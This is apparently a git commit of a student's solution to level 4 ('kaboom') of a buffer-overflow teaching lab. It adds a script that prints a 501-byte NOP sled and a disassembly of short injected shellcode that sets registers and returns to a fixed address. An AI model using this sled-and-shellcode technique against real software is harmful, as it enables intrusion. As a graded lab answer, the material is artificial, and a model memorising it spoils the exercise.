bd44001c3773a8575bec85e4b8e7f01c94290d49
youling chan <chenyoucyl@gmail.com>
2014-02-09 15:08:05 +0800

    level 4: kaboom

---
+++ buflab-handout/echo_nop.sh
@@ -0,0 +1,6 @@
+#!/usr/bin/bash
+
+for i in {1..501}
+do
+   printf "0x90 "
+done
---
+++ buflab-handout/kaboom.d
@@ -0,0 +1,11 @@
+
+kaboom.o:     file format elf32-i386
+
+
+Disassembly of section .text:
+
+00000000 <.text>:
+   0:	a1 e4 c1 04 08       	mov    0x804c1e4,%eax
+   5:	8d 6c 24 28          	lea    0x28(%esp),%ebp
+   9:	68 93 8c 04 08       	push   $0x8048c93
+   e:	c3                   	ret    
